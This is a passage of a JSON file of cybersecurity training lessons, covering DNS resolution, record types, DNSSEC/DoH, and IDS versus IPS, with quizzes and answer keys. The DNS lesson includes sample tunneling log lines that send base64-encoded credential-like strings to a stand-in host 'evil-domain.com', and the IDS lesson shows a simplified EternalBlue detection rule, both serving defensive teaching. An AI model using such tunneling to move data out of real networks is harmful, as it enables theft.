  "id": "networking-lesson-dns-deep-dive",
  "slug": "dns-deep-dive-records-resolution-security",
  "title": "DNS Deep Dive: Records, Resolution, and DNS Security",
  "topic": "Networking",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "DNS is the internet's phone book, translating names people remember into addresses machines use. For a SOC analyst it is far more than plumbing: because almost every connection begins with a name lookup, DNS logs capture the *intent* of a host before any data is exchanged. This lesson assumes zero prior knowledge of DNS. It starts with why the phone-book problem exists at all, walks the full resolution path step by step with a worked trace, decodes the record types you will meet in logs with real examples, covers the security features and blind spots — DNSSEC, DoH/DoT — that shape how much you can actually see, and finishes with side-by-side worked examples of two of the most important DNS-based attack patterns: DGA and DNS tunneling.",
  "sections": [
    {
      "heading": "From Zero: Why Do We Need DNS at All?",
      "content": "### The phonebook analogy, taken literally\n\nBefore mobile phones stored contacts, phones came with a **phonebook**: a fat printed book listing names in alphabetical order next to their phone numbers. You knew your friend's name, not their number, so you looked the name up and dialed the number you found. Computers have exactly this problem at internet scale: humans remember names like `www.example.com`, but the actual network only knows how to route traffic to a **numeric IP address** (covered in the addressing lesson). **DNS (Domain Name System)** is the automated, constantly-updated phonebook that bridges the two, and it runs, invisibly, before almost every single connection made on the internet.\n\n### What 'resolving a name' actually means\n\nWhen any process on your computer — a browser, an app, a background updater — needs to reach `www.example.com`, it must first **resolve** that name, meaning: ask DNS, 'what IP address does this name currently point to?', and get an answer back before it can even attempt to connect. This single request-and-answer exchange is called a **DNS query** (the question) and a **DNS response** (the answer). The response usually also comes with a **TTL (time to live)** — a number of seconds telling any resolver 'you may reuse this answer for this long before asking again', which is what makes DNS fast on repeat lookups.\n\n### A first look at a real query and answer\n\n```\nQuery:    what is the A record for www.example.com?\nResponse: www.example.com has address 93.184.216.34\n          TTL: 300 (cache this answer for 300 seconds)\n```\n\nThat is the entire idea in miniature: name in, address out, with an expiry. The next section opens up *who* actually answers that question, because — just like a real phonebook is compiled by an organization, not created on the spot — the answer for `www.example.com` has to come from somewhere authoritative, and getting there involves several servers cooperating in a specific order."
    },
    {
      "heading": "How Resolution Works, End to End",
      "content": "When a host wants to reach `www.example.com`, it does not know the IP address, so it asks **DNS** to resolve the name. The journey involves several distinct players.\n\nThe host first asks its configured **recursive resolver** (also called a recursive or caching resolver) — often the corporate DNS server or a public one like `8.8.8.8`. The recursive resolver takes on the job of doing the legwork and returning a final answer. If it already has the answer **cached** from a recent lookup, it responds immediately; caching is why repeat lookups are fast and why cache **TTL** values matter.\n\nIf the answer is not cached, the recursive resolver walks the DNS hierarchy on the host's behalf:\n\n1. It asks a **root server** (there are 13 root server identities worldwide), which does not know `example.com` but points to the servers responsible for `.com`.\n2. It asks the `.com` **TLD (top-level domain) server**, which points to the **authoritative name servers** for `example.com`.\n3. It asks the **authoritative name server** — the one that actually holds the real records for the domain — which returns the definitive answer, say `93.184.216.34`.\n\n### A resolution trace, spelled out\n\n```\nClient        -> Recursive resolver:  what is the A record for www.example.com?\nResolver      -> Root server:          who handles .com?\nRoot server   -> Resolver:             ask these .com TLD servers\nResolver      -> .com TLD server:      who is authoritative for example.com?\nTLD server    -> Resolver:             ask ns1.example.com\nResolver      -> ns1.example.com:      what is the A record for www.example.com?\nns1.example.com -> Resolver:           93.184.216.34, TTL 300\nResolver      -> Client:               93.184.216.34 (and caches it for 300s)\n```\n\nNotice the client only ever talks to the resolver — one recursive question in, one final answer out — while the resolver does five separate 'iterative' hops behind the scenes to build that answer. This is exactly why the recursive resolver is such a valuable log source: it is the single point that saw every intermediate step, even though the client only experienced the final result.\n\n**Why this matters to an analyst:** the point where you usually get logs is the **recursive resolver** — it sees every internal host's every lookup. That vantage point is enormously valuable because it records what each machine *wanted to reach* by name, cache and all. Understanding the hierarchy also helps you reason about poisoning and hijacking: if an answer could be forged at the resolver or in transit, a host can be silently steered to an attacker's IP, which is exactly the risk **DNSSEC** was designed to address."
    },
    {
      "heading": "The Record Types You'll See in Logs",
      "content": "DNS holds many **record types**, each answering a different question about a name. Recognizing them in query logs tells you what a host was trying to do.\n\n| Record | Purpose | Analyst relevance |\n|---|---|---|\n| **A** | Maps a name to an IPv4 address | The most common lookup; what host is being reached |\n| **AAAA** | Maps a name to an IPv6 address | Same as A but for IPv6; easy to overlook |\n| **CNAME** | Alias pointing one name to another name | Redirection chains; used by CDNs and some abuse |\n| **MX** | Mail exchanger for a domain | Where email for a domain is delivered |\n| **TXT** | Arbitrary text (SPF, DKIM, verification) | Also abused to smuggle data or C2 payloads |\n| **NS** | Delegates a zone to authoritative name servers | Who controls a domain's records |\n| **PTR** | Reverse lookup: IP back to a name | Used to name an address; part of enrichment |\n\n### What records actually look like in a zone\n\n```\nwww.example.com.    300  IN  A      93.184.216.34\nexample.com.         3600 IN  MX    10 mail.example.com.\nexample.com.         3600 IN  TXT   v=spf1 include:_spf.example.com ~all\nexample.com.         3600 IN  NS    ns1.example.com.\n34.216.184.93.in-addr.arpa. 3600 IN PTR www.example.com.\n```\n\nEach line names the record's owner name, its TTL, its class (`IN` = internet, essentially always this value), its type, and its value. Reading actual zone data like this is rare for a Tier-1 analyst, but recognizing the shape helps when a report or a `dig`/`nslookup` output lands in front of you during an investigation.\n\nA few record types deserve extra attention. **CNAME** records create alias chains — `www.example.com` might be a CNAME to a CDN hostname that is itself a CNAME to another — and following those chains is routine in investigations. **TXT** records are a favorite of attackers because they can hold arbitrary strings; **DNS tunneling** and some C2 frameworks stash encoded data in TXT queries and responses. **MX** lookups tell you a host is preparing to send mail, useful when a workstation that should never send email suddenly does MX lookups for many external domains — a possible spam-bot or compromise signal. **PTR** (reverse DNS) is the inverse mapping and shows up when tools or logs enrich an IP into a hostname.\n\nAs an analyst, the record type is a clue to intent: a burst of **A/AAAA** lookups for many random-looking hostnames hints at malware resolving a **DGA (domain generation algorithm)** list; unusual **TXT** query volume hints at tunneling; **MX** lookups from a non-mail host hint at abuse. You are reading the *questions* a host asks, and the questions often reveal purpose before a single byte of payload moves."
    },
    {
      "heading": "DNS Security: DNSSEC, DoH, and DoT",
      "content": "Classic DNS was designed in a trusting era: queries and answers travel in **plaintext UDP** with no authentication, which invites two problems — **tampering** (forging answers to redirect victims, i.e., cache poisoning/spoofing) and **eavesdropping** (anyone on the path can read what names you look up). Three technologies address these, and each has a different effect on *your* visibility.\n\n**DNSSEC (DNS Security Extensions)** tackles **authenticity/integrity**, not privacy. It adds cryptographic signatures to DNS records so a resolver can verify that an answer genuinely came from the authoritative source and was not altered in transit. DNSSEC does **not** encrypt anything — queries are still visible — it just makes forged answers detectable. For an analyst, DNSSEC reduces the risk of poisoning-based redirection but does not change what you can log.\n\n**DoT (DNS over TLS)** and **DoH (DNS over HTTPS)** tackle **privacy/confidentiality** by encrypting the query between the client and the resolver. DoT runs on its own dedicated port (**853**), which at least makes it identifiable on the network. **DoH** is the visibility-killer: it wraps DNS inside ordinary **HTTPS on port 443**, so DNS lookups become indistinguishable from normal web traffic to a network sensor.\n\nThis is a genuine double-edged sword for the SOC. Encryption protects users from eavesdropping and is good for privacy, but it can **blind the network-level DNS monitoring** that analysts depend on. If endpoints or browsers use an external DoH resolver, your corporate DNS server never sees those lookups, and one of your best log sources goes dark. The common defensive responses: **force all clients to use the internal, logged resolver**, **block or detect external DoH/DoT endpoints**, and lean more on **endpoint (EDR) DNS telemetry** where the lookup is visible on the host before encryption. Recognizing whether your environment allows external DoH is essential context — it determines whether the absence of a lookup in your DNS logs means the host stayed quiet or simply resolved names through a channel you cannot see."
    },
    {
      "heading": "Why DNS Is the First Place Investigations Look",
      "content": "Ask experienced analysts where they start an investigation and DNS logs come up again and again. The reasons are structural, not habit.\n\n### DNS records intent early\n\nBecause a name lookup precedes the actual connection, DNS logs capture what a host *intended* to reach even if the connection later fails or is encrypted. A workstation that resolves a known-malicious domain has already told you something, regardless of what happened next.\n\n### It is a compact, central, high-signal source\n\nOne recursive resolver logs every internal host's lookups in a small, uniform format — far lighter than full packet capture and available for nearly every host. That makes DNS ideal for both alerting and retrospective hunting across the whole estate.\n\nThree hunting patterns you should know by name:\n\n- **Newly registered domains (NRDs).** Malware and phishing frequently use domains registered days or hours before use. Enriching lookups with **domain age** and flagging very young domains catches a large slice of malicious activity cheaply.\n- **DGA domains.** Some malware generates hundreds of algorithmic, random-looking domains (`kq3v9z7x.info`) and tries them until one resolves to the current C2. In DNS logs this appears as a **flood of A/AAAA lookups for high-entropy names, most returning NXDOMAIN (nonexistent)** — a very recognizable pattern.\n- **DNS tunneling.** Data can be smuggled inside DNS itself — encoded in the subdomains of queries or in TXT responses — to exfiltrate data or carry C2 past firewalls that trustingly allow DNS. Tells include abnormally long or high-entropy subdomains, unusual query volume to one domain, and heavy TXT/NULL record use.\n\nThe throughline: DNS turns a host's *intentions* into log lines you can search. Master reading those lines — the record types, the domain ages, the entropy, the query volumes — and you gain an early-warning system that fires before the payload ever moves. That is why DNS is so often the first pivot and the last word in a SOC investigation."
    },
    {
      "heading": "Worked Example: Spotting a DGA and a Tunnel in Raw Logs",
      "content": "Reading about DGA and tunneling in the abstract is one thing; recognizing the shape in an actual log export is the skill that matters. Here are two side-by-side excerpts.\n\n```\nNormal user browsing (baseline):\n09:00:01 client=10.4.2.17 query=www.google.com       type=A   answer=OK\n09:00:04 client=10.4.2.17 query=mail.office365.com    type=A   answer=OK\n09:00:11 client=10.4.2.17 query=cdn.jsdelivr.net       type=A   answer=OK\n\nSuspected DGA (same host, few minutes later):\n09:03:02 client=10.4.2.17 query=kq3v9z7x1a.info        type=A   answer=NXDOMAIN\n09:03:02 client=10.4.2.17 query=m2plq0dzs4.info        type=A   answer=NXDOMAIN\n09:03:03 client=10.4.2.17 query=zt8fbn31rq.info         type=A   answer=NXDOMAIN\n09:03:03 client=10.4.2.17 query=jx03kd82wm.biz          type=A   answer=NXDOMAIN\n   ... (200+ more in under two minutes, nearly all NXDOMAIN)\n```\n\nThe baseline block shows short, recognizable, English-ish domains, spaced seconds apart, almost all resolving successfully — completely ordinary browsing. The second block shows dozens of **high-entropy** names (long strings with no readable pattern, mixing letters and digits with no discernible words), fired in rapid bursts, almost all failing with **NXDOMAIN** (the DNS response meaning 'this name does not exist'). That failure rate is the tell: a human never types dozens of nonsense domains a minute, but malware cycling through a DGA's candidate list absolutely does, because it does not yet know which one its operator has actually registered today.\n\n```\nSuspected DNS tunneling (same idea, different shape):\n09:05:00 client=10.4.2.17 query=YWRtaW46cGFzc3dvcmQ.data.evil-domain.com type=TXT\n09:05:01 client=10.4.2.17 query=aGVsbG8gd29ybGQgdGVzdA.data.evil-domain.com type=TXT\n09:05:02 client=10.4.2.17 query=c3NoIC1pIGtleS5wZW0.data.evil-domain.com type=TXT\n   ... (thousands of unique subdomains under one parent domain, over hours)\n```\n\nHere the tell is different: not randomness for its own sake, but a very long, **base64-looking subdomain** (a giveaway that data is encoded inside the query itself), an unusual **TXT** record type used repeatedly, and the *same parent domain* (`evil-domain.com`) reused thousands of times with a *different* subdomain every single query — because each query is smuggling out a different chunk of stolen data. Whereas DGA traffic looks like 'trying many different domains', tunneling looks like 'hammering one domain with endless unique subdomains'. Learning to tell these two shapes apart at a glance is one of the highest-value DNS skills a SOC analyst can build."
    }
  ],
  "keyTakeaways": [
    "DNS is the automated phonebook that turns names into IP addresses before almost every connection; a client asks one recursive question, and the resolver performs several iterative hops (root -> TLD -> authoritative) behind the scenes to build the final answer.",
    "Because a name lookup precedes almost every connection, DNS logs at the recursive resolver capture each host's intent early and centrally — making them the first pivot for spotting malicious destinations, newly registered domains, and DGA activity.",
    "Record types reveal intent: A/AAAA show what's being reached, TXT is a favorite channel for tunneling and SPF text, MX shows mail intent, and PTR reverses an IP back to a name — recognizing the type in a log line tells you what a host was trying to do.",
    "DNSSEC protects answer integrity but not privacy, while DoH/DoT encrypt lookups and can blind network DNS monitoring — so force clients to the internal logged resolver, detect external DoH, and rely on endpoint DNS telemetry where needed.",
    "DGA traffic looks like many different high-entropy domains mostly failing with NXDOMAIN in a short burst; DNS tunneling looks like endless unique subdomains (often base64-like, often TXT records) hammering the same parent domain — learning to tell the two shapes apart is a core DNS-hunting skill."
  ],
  "quiz": [
    {
      "question": "In your DNS logs a single internal workstation generates hundreds of lookups for random-looking, high-entropy hostnames within a few minutes, and most responses are NXDOMAIN. What does this pattern most likely indicate?",
      "options": [
        {
          "label": "A misconfigured DNS server that is failing to cache answers and therefore repeatedly forwarding the same query upstream.",
          "value": "a"
        },
        {
          "label": "Malware using a domain generation algorithm, cycling through many algorithmic domains until one resolves to its current C2 server.",
          "value": "b"
        },
        {
          "label": "Normal web browsing, since modern websites legitimately trigger hundreds of unrelated random hostname lookups per page.",
          "value": "c"
        },
        {
          "label": "A DNSSEC validation failure that forces the resolver to retry each signed record under many different names.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): a flood of high-entropy hostname lookups mostly returning NXDOMAIN is the classic DGA signature — malware tries many algorithmic domains until it finds the one currently registered for C2. (a) is wrong: caching failures repeat the *same* name, not many unique high-entropy names. (c) is wrong: legitimate browsing resolves recognizable domains and does not produce mass NXDOMAIN responses. (d) is wrong: DNSSEC validation concerns signature checks on real records, not the generation of hundreds of random nonexistent names."
    },
    {
      "question": "Your organization logs DNS at the internal recursive resolver. Some endpoints begin using an external DNS-over-HTTPS (DoH) resolver. What is the security impact and best response?",
      "options": [
        {
          "label": "DoH encrypts DNS inside port 443 HTTPS, so those lookups bypass your logging; force clients to the internal resolver and detect external DoH.",
          "value": "a"
        },
        {
          "label": "DoH improves your visibility because encrypted lookups are automatically decrypted and stored in full by the internal recursive resolver.",
          "value": "b"
        },
        {
          "label": "DoH has no monitoring impact since all DNS queries, encrypted or not, are still recorded centrally by the root name servers.",
          "value": "c"
        },
        {
          "label": "DoH only affects DNSSEC signature validation, so the correct fix is to disable DNSSEC on the internal resolver entirely.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct (a): DoH wraps DNS in ordinary HTTPS on port 443, so those lookups no longer reach your internal resolver's logs; the standard response is to force clients onto the internal logged resolver and detect or block external DoH. (b) is wrong: the internal resolver never sees externally-resolved DoH queries, so it cannot decrypt or store them. (c) is wrong: root servers do not log every organization's client queries. (d) is wrong: DoH is about privacy/encryption, not DNSSEC validation, and disabling DNSSEC would only remove integrity protection."
    },
    {
      "question": "During an investigation you need to know which server actually holds the authoritative records for a suspicious domain, not just which server your workstation asked first. Which server in the resolution chain holds that definitive answer?",
      "options": [
        {
          "label": "The recursive resolver, because it is the only server a client ever directly communicates with during a lookup.",
          "value": "a"
        },
        {
          "label": "The root server, because every DNS query in the world is answered directly and completely by one of the 13 root servers.",
          "value": "b"
        },
        {
          "label": "The authoritative name server for that domain, because it is the definitive source the recursive resolver ultimately queries and trusts.",
          "value": "c"
        },
        {
          "label": "The TLD server for .com, because top-level domain servers store the full record set for every domain underneath them.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Correct (c): the authoritative name server is the definitive source that actually holds a domain's real records; the recursive resolver walks root -> TLD -> authoritative to reach it. (a) is wrong: the recursive resolver only relays the client's question, it does not hold the definitive record itself. (b) is wrong: root servers only point to the correct TLD servers, they never answer with the final IP. (d) is wrong: TLD servers only delegate to the authoritative servers, they do not store each domain's full record set."
    }
  ],
  "references": [
    "https://www.cloudflare.com/learning/dns/what-is-dns/",
    "https://datatracker.ietf.org/doc/html/rfc8484",
    "https://www.sans.org/blog/detecting-dns-tunneling/",
    "https://attack.mitre.org/techniques/T1071/004/"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "networking-lesson-ids-vs-ips",
  "slug": "ids-vs-ips",
  "title": "IDS vs IPS",
  "topic": "Network Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "IDS and IPS are two of the most misunderstood boxes on a network diagram, yet the alerts they produce land on a SOC analyst's queue every day. The difference between them is really a difference in *where they sit* and *what they are allowed to do* — one watches and warns, the other stands in the path and blocks. This lesson starts from the basic idea of what a sensor is even watching, pins down the detection-vs-prevention distinction, explains signature versus anomaly detection, walks a real signature rule field by field, covers placement and traffic-feeding mechanisms, and shows what you actually do with the alerts they generate.",
  "sections": [
    {
      "heading": "From Zero: What Is a Sensor Actually Watching?",
      "content": "### Packets: the envelopes of network traffic\n\nEvery piece of network communication — a web page loading, a file transfer, a login — is broken into small chunks called **packets**. Think of a packet as a single envelope: it has a 'from' address, a 'to' address, and a small piece of the actual content inside, and a message is really dozens or thousands of these envelopes sent one after another and reassembled at the far end. Anything that watches network traffic — an IDS, an IPS, a full packet-capture tool — is really watching a stream of these envelopes flow past.\n\n### What 'monitoring' vs 'blocking' means at the packet level\n\nA **sensor** is any device or software positioned to look at (and possibly act on) that stream of packets. There are exactly two positions a sensor can be placed in relative to the actual flow of traffic, and this single positioning choice is the entire difference between an IDS and an IPS — which is why it is the very first thing this lesson explains in depth. Before getting to that, it helps to name the goal plainly: the whole point of an IDS or IPS is to look inside that stream of envelopes and recognize the ones that represent an attack — a known exploit, a malware download, a port scan — either flagging them after the fact or physically preventing them from being delivered.\n\n### Two philosophies, one goal\n\nThis lesson answers two separate design questions: *where does the sensor sit* (out-of-band and merely watching, vs inline and able to act), and *how does it decide something is malicious* (by matching known bad patterns, or by noticing something unusual). Keep those two questions separate in your head as you read — placement and detection method are independent choices that combine to describe any real IDS/IPS deployment."
    },
    {
      "heading": "Detection vs Prevention: Out-of-Band vs Inline",
      "content": "An **IDS (Intrusion Detection System)** monitors network traffic for malicious or policy-violating activity and **raises an alert** when it sees something suspicious. Crucially, an IDS is typically deployed **out-of-band** — it receives a *copy* of the traffic and sits outside the actual forwarding path. Because it is not in the path, it can watch everything without risking network availability, but it also **cannot stop** what it sees; by the time it alerts, the packet has already passed.\n\nAn **IPS (Intrusion Prevention System)** does everything an IDS does *and* can **actively block** malicious traffic. To do that it must sit **inline** — directly in the forwarding path, so every packet flows *through* it. Being inline is what gives the IPS the power to drop, reset, or reject a connection in real time, but it also means the IPS is a potential point of failure and latency: if it goes down or slows, it can disrupt legitimate traffic.\n\nThe cleanest way to remember the distinction:\n\n| | IDS | IPS |\n|---|---|---|\n| Placement | Out-of-band (copy of traffic) | Inline (in the traffic path) |\n| Primary action | Alert / log | Alert **and** block/drop/reset |\n| Effect on traffic | None (passive) | Can stop packets in real time |\n| Risk if it fails | Loses visibility only | Can disrupt or drop legitimate traffic |\n| Analyst posture | Investigate after the fact | Investigate + verify what was blocked |\n\nThink of an IDS as a **security camera** — it records and alarms but cannot lock the door — and an IPS as a **security guard at the door** who can actually stop someone from entering. Many modern products are technically the same engine that can run in either mode; whether it *detects* or *prevents* comes down to deployment and configuration. That single choice — inline or out-of-band — drives everything else, including how much you trust the box to act automatically and how carefully it must be tuned before you let it block."
    },
    {
      "heading": "Signature-Based vs Anomaly-Based Detection",
      "content": "Independent of placement, an IDS/IPS decides *what* is malicious using one (usually both) of two detection philosophies.\n\n**Signature-based detection** matches traffic against a database of known **signatures** — specific patterns tied to known attacks, malware, or exploits (a byte sequence, a suspicious URI, a known-bad payload). It is precise and produces **explainable, low-false-positive alerts for known threats**: when a signature fires, you can read exactly which rule matched and why. Its weakness is symmetrical — it can only catch what someone has already written a signature for, so **novel or zero-day attacks and simple obfuscation can slip past**. Signature sets must be updated constantly, much like antivirus definitions.\n\n**Anomaly-based detection** builds a **baseline of normal behavior** and flags deviations from it. Instead of asking 'does this match a known attack?', it asks 'is this unusual for this network?' — an unexpected protocol on a port, a host suddenly transferring far more data than usual, a spike in connections. Its strength is the mirror image of signatures: it can catch **previously unseen attacks** that no signature covers. Its weakness is a **higher false-positive rate**, because 'unusual' is not the same as 'malicious' — a legitimate but rare event (a backup job, a new application rollout) can trip it.\n\n| | Signature-based | Anomaly-based |\n|---|---|---|\n| Detects by | Matching known patterns | Deviation from a learned baseline |\n| Catches novel attacks? | No | Yes |\n| False positives | Lower | Higher |\n| Alert explainability | High (named rule) | Lower (statistical) |\n\nFor an analyst, the *type* of detection shapes how you triage. A **signature alert** hands you a named rule and a reference — start by confirming the match was real and not a benign string that happened to fit the pattern. An **anomaly alert** hands you a statistical outlier with less context — start by establishing what 'normal' looks like for that host and whether there is a benign explanation. Good programs run both: signatures for cheap, high-confidence detection of known bad, and anomaly detection to surface the unknown that signatures structurally cannot see."
    },
    {
      "heading": "Worked Example: Reading a Real Signature Rule",
      "content": "Signature-based detection is easiest to understand by reading an actual rule. Snort and Suricata (the two open-source engines named later in this lesson) both use a very similar rule syntax. Here is a simplified example:\n\n```\nalert tcp any any -> $HOME_NET 445 (\n  msg:POSSIBLE SMB EternalBlue Exploit Attempt;\n  flow:to_server,established;\n  content:SMB header bytes; offset:4; depth:5;\n  content:secondary marker bytes; distance:0;\n  reference:cve,2017-0144;\n  classtype:attempted-admin;\n  sid:2024218; rev:3;\n)\n```\n\nReading it field by field:\n\n- **`alert`** — the action: log this as an alert (an equivalent IPS rule might say `drop` instead, blocking the packet).\n- **`tcp any any -> $HOME_NET 445`** — the traffic to match: any TCP traffic from any source/port, heading *to* our protected network (`$HOME_NET`, a variable defined elsewhere) on port 445 — which you will recognize as the SMB port.\n- **`msg`** — the human-readable description shown in your alert queue.\n- **`content`** — the actual byte patterns to look for inside the packet; this is the signature itself, the specific bytes known to appear in this exploit's traffic.\n- **`reference:cve,2017-0144`** — ties the rule to a known vulnerability (this example references the real CVE behind EternalBlue/WannaCry).\n- **`classtype`** — a category used for prioritizing and reporting.\n- **`sid` / `rev`** — a unique rule ID and revision number, so you (and the vendor) can track exactly which rule version fired.\n\nWhen an alert like this lands in your queue, the `msg`, `content`, and `reference` fields are your starting context — they tell you *exactly* what pattern matched and *why* it is believed malicious, which is precisely the 'explainable, low-false-positive' property signature detection was praised for earlier in this lesson. Compare that to an anomaly-based alert, which typically only tells you 'this deviated from baseline by X' with no equivalent named pattern to check — a good illustration of the trade-off between the two detection philosophies."
    },
    {
      "heading": "Placement, Taps, and SPAN",
      "content": "Where you put the sensor determines what it can see, and how you feed it traffic differs sharply between IDS and IPS.\n\nBecause an **IDS is out-of-band**, it needs a *copy* of the traffic. Two mechanisms provide that copy:\n\n- A **network tap** is a hardware device inserted into a physical link that passively duplicates every passing packet to a monitoring port. Taps are reliable, do not drop frames under load, and are the preferred feed for serious monitoring.\n- A **SPAN port** (Switched Port Analyzer), also called port mirroring, is a switch feature that copies traffic from selected ports or VLANs to a designated mirror port. SPAN is cheap and flexible but can **drop mirrored packets under heavy load** and may not capture certain error frames, so it is a lighter-weight option than a tap.\n\nEither way, the IDS analyzes a duplicate stream and never touches the originals — which is exactly why it cannot block.\n\nAn **IPS**, by contrast, is spliced **directly into the link** so the real traffic passes through it; there is no copy, because the IPS *is* on the path and can therefore drop packets. This inline position is usually chosen at a **network chokepoint** — commonly at the **perimeter**, just inside or integrated with the edge firewall, where all ingress/egress traffic converges. Sensors are also placed at **internal segment boundaries** (for example between the user VLAN and the server/DMZ) to watch **east-west lateral movement**, and in front of especially sensitive assets.\n\nThis placement reasoning connects directly to the subnet and segmentation ideas from earlier networking lessons. The most valuable sensor locations are the **boundaries you already care about** — the perimeter and the crossings between trust zones — because that is where an attacker's traffic must pass and where a single sensor sees the most meaningful flows. When you receive an alert, knowing *which sensor and which chokepoint* it came from is itself intelligence: a perimeter sensor firing on inbound traffic tells a different story than an internal sensor firing on a workstation reaching a server subnet. Always read the sensor's vantage point as part of the alert."
    },
    {
      "heading": "False Positives, Tuning, and Working the Alerts",
      "content": "IDS/IPS sensors are only as useful as their tuning, and tuning is where the analyst's judgment meets the engineering. A freshly deployed sensor with default rules is typically **noisy** — it fires on benign traffic that superficially resembles attacks. That noise is dangerous in two ways: it buries real detections (alert fatigue), and on an *IPS* a false positive does not merely annoy, it can **block legitimate business traffic**, which is why IPS blocking rules are introduced cautiously and often run in 'alert-only' mode first.\n\n**Tuning** is the ongoing process of reducing false positives while preserving true detections: disabling or refining rules that do not apply to your environment, adding exceptions for known-good sources, and adjusting anomaly baselines as the network changes. It is never 'set and forget' — new applications and traffic patterns require continual adjustment.\n\nWhen an IDS/IPS alert lands in your queue, a disciplined workflow serves you well:\n\n- **Read the rule.** What signature or anomaly fired, and what is it *supposed* to detect? The rule name, ID, and reference are your starting context.\n- **Confirm it is a true positive.** Examine the actual traffic or payload that triggered it. Did the pattern really indicate an attack, or did benign data coincidentally match? This is the core of triage.\n- **Establish context.** Which host, which sensor/chokepoint, inbound or outbound, and does the source or destination have a bad reputation? Pivot to firewall, DNS, and endpoint logs to corroborate.\n- **For IPS alerts, verify what was blocked.** If the IPS already dropped the traffic, confirm the block succeeded and decide whether any follow-up (endpoint isolation, hunting for earlier stages) is needed. A block is containment of *one* connection, not proof the threat is fully handled.\n- **Feed tuning back.** Recurring false positives should be reported so the rule is refined; a confirmed true positive may justify a *new* or tightened rule.\n\n**Snort** and **Suricata** are the two best-known open-source engines and are worth naming: both are rule-based systems (Suricata is multi-threaded and adds richer protocol and file analysis) that can run as either IDS or IPS depending on deployment. Recognizing their rule format — the named, referenced signatures you'll see in alerts — makes real-world IDS/IPS output far less intimidating and turns each alert into a lead you can actually work."
    }
  ],
  "keyTakeaways": [
    "A sensor watches or acts on the stream of packets that make up network traffic; the defining difference is placement and authority: an IDS is out-of-band (fed by a tap or SPAN), only alerts, and never touches traffic; an IPS is inline at a chokepoint and can block in real time.",
    "Signature detection catches known threats with explainable, low-false-positive alerts but misses novel attacks, while anomaly detection catches the unknown at the cost of more false positives — triage a signature alert by confirming the match and an anomaly alert by establishing the host's normal baseline.",
    "A signature rule (Snort/Suricata syntax) names its match pattern, a CVE reference, and a unique sid — read those fields directly to understand exactly what was matched and why, rather than treating the alert as a black box.",
    "IDS sensors need a copy of traffic via a network tap (reliable, no drops) or a SPAN/mirror port (cheap but can drop packets under load); IPS sensors are spliced directly inline, usually at the perimeter or at internal segment boundaries where lateral movement would cross.",
    "Freshly deployed sensors are noisy by default; disciplined tuning — refining rules, adding known-good exceptions, and running new IPS blocks in alert-only mode first — is what keeps an IPS from disrupting legitimate business traffic while still catching real threats."
  ],
  "quiz": [
    {
      "question": "Your team wants a sensor that can actively drop a known exploit attempt before it reaches an internal server, not merely alert on it after the fact. Which deployment meets that requirement, and what trade-off comes with it?",
      "options": [
        {
          "label": "An IDS fed by a SPAN port, since mirrored traffic lets it reset malicious connections while staying safely off the forwarding path.",
          "value": "a"
        },
        {
          "label": "An inline IPS, which sits in the traffic path and can drop packets in real time but becomes a point of latency or failure.",
          "value": "b"
        },
        {
          "label": "An out-of-band IDS connected via a hardware tap, because taps duplicate traffic fast enough to block the original packets.",
          "value": "c"
        },
        {
          "label": "A perimeter firewall alone, since stateful firewalls inspect application payloads and block exploits without any dedicated sensor.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): only an inline IPS sits in the forwarding path and can drop malicious packets in real time, with the trade-off that being inline adds latency and a potential failure/availability risk. (a) is wrong: an IDS on a SPAN port only sees copies and cannot stop the originals. (c) is wrong: a tap also delivers only a copy to an out-of-band IDS, which cannot block. (d) is wrong: a traditional firewall filters by rules and state but is not designed to detect and drop specific exploit signatures the way an IPS does."
    },
    {
      "question": "A newly deployed IPS with default rules is generating many alerts, and some are blocking legitimate business traffic. What is the appropriate way to handle this situation?",
      "options": [
        {
          "label": "Disable the IPS entirely and replace it with an out-of-band IDS, because inline devices are inherently unsuitable for production.",
          "value": "a"
        },
        {
          "label": "Ignore the blocked-traffic reports, since any traffic an IPS drops is by definition malicious and safe to discard.",
          "value": "b"
        },
        {
          "label": "Tune the sensor by refining or disabling misfiring rules and adding known-good exceptions, ideally running new blocks in alert-only mode first.",
          "value": "c"
        },
        {
          "label": "Switch every rule to anomaly-based detection, which eliminates false positives because baselines never flag legitimate activity.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Correct (c): tuning — refining or disabling rules that misfire, adding exceptions for known-good sources, and validating new blocking rules in alert-only mode before enforcing — reduces false positives while preserving real detections. (a) is wrong: inline IPS is standard in production; the fix is tuning, not abandonment. (b) is wrong: an IPS can absolutely block legitimate traffic on a false positive, so those reports must be investigated. (d) is wrong: anomaly detection actually tends to produce *more* false positives, not fewer, since unusual is not the same as malicious."
    },
    {
      "question": "An IDS alert references a Suricata rule with msg 'POSSIBLE SMB EternalBlue Exploit Attempt' and reference cve,2017-0144. What should an analyst do first with this information?",
      "options": [
        {
          "label": "Ignore the reference field since CVE numbers are only relevant to patch management teams, not to alert triage.",
          "value": "a"
        },
        {
          "label": "Check the CVE and content match to confirm the traffic fits the known exploit before deciding true or false positive.",
          "value": "b"
        },
        {
          "label": "Assume the alert is automatically a false positive, since signature-based rules never reference real, published vulnerabilities.",
          "value": "c"
        },
        {
          "label": "Disable the rule immediately, because any rule mentioning a specific CVE is guaranteed to generate excessive noise.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): the msg, content match, and CVE reference tell you exactly what pattern was matched and why, so the right first step is confirming the actual traffic really fits that known exploit before ruling on true or false positive. (a) is wrong: the CVE reference is precisely the triage context an analyst needs. (c) is wrong: signature rules routinely and usefully reference real published CVEs. (d) is wrong: referencing a CVE does not make a rule noisy; disabling it without investigation could hide real EternalBlue attempts."
    }
  ],
  "references": [
    "https://www.paloaltonetworks.com/cyberpedia/what-is-an-intrusion-prevention-system-ips",
    "https://docs.suricata.io/en/latest/what-is-suricata.html",
    "https://www.snort.org/faq/what-is-snort",
    "https://nvd.nist.gov/vuln/detail/CVE-2017-0144"
  ],
  "xp": 230,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-owasp-top-10-tour",
